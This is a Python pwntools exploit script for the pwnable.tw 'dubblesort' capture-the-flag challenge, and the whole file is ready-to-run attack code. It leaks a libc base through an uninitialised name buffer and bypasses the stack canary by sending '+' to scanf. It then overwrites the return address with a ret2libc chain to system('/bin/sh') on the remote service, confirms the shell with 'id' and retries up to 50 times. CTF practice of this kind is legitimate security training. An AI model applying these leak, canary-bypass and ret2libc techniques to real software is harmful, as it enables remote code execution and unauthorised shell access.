#!/usr/bin/env python3
"""
pwnable.tw - dubblesort (200 pts)

Based on HackMD writeup structure exactly:
- 35 numbers total (indices 0-34)
- Positions 0-23: small values
- Position 24: '+' (canary bypass)
- Positions 25-31: libc_base (7 values)
- Position 32: system
- Position 33: system (for return)
- Position 34: /bin/sh
"""

from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = "chall.pwnable.tw"
PORT = 10101

SYSTEM_OFFSET = 0x3A940
BINSH_OFFSET = 0x158E8B


def try_exploit(local=False):
    try:
        if local:
            r = process("./dubblesort", env={"LD_PRELOAD": "./libc_32.so.6"})
        else:
            r = remote(HOST, PORT, timeout=15)

        r.recvuntil(b"What your name :")
        r.send(b"A" * 32)

        r.recvuntil(b"Hello ")
        data = r.recvuntil(b",How many")
        data = data[: -len(b",How many")]

        if len(data) < 36:
            r.close()
            return None

        leak = u32(data[32:36])
        libc_base = leak - 0x1AE601

        system_addr = libc_base + SYSTEM_OFFSET
        binsh_addr = libc_base + BINSH_OFFSET

        log.info(f"base={hex(libc_base)}, sys={hex(system_addr)}, sh={hex(binsh_addr)}")

        # Send exactly 35 numbers (0-34)
        r.recvuntil(b"sort :")
        r.sendline(b"35")

        for i in range(35):
            r.recvuntil(b"number :")
            if i < 24:
                # Use ascending values
                r.sendline(str(i).encode())
            elif i == 24:
                # Skip canary
                r.sendline(b"+")
            elif i <= 31:
                # 7 values of libc_base as padding
                r.sendline(str(libc_base).encode())
            elif i == 32:
                # system address
                r.sendline(str(system_addr).encode())
            elif i == 33:
                # dummy return for system
                r.sendline(str(system_addr).encode())
            elif i == 34:
                # /bin/sh argument
                r.sendline(str(binsh_addr).encode())

        # Wait for result and try command
        try:
            r.recvuntil(b"Result", timeout=3)
            r.recvline()
        except:
            pass

        r.sendline(b"id")
        try:
            response = r.recv(timeout=2)
            if b"uid=" in response:
                log.success("Got shell!")
                r.interactive()
                return True
        except:
            pass

        r.close()
        return False

    except Exception as e:
        return False


def exploit(local=False, max_attempts=50):
    for attempt in range(max_attempts):
        log.info(f"=== Attempt {attempt + 1}/{max_attempts} ===")
        if try_exploit(local):
            return True

    log.error(f"Failed after {max_attempts} attempts")
    return False


if __name__ == "__main__":
    import sys
    local = len(sys.argv) > 1 and sys.argv[1] == "local"
    exploit(local, max_attempts=50)
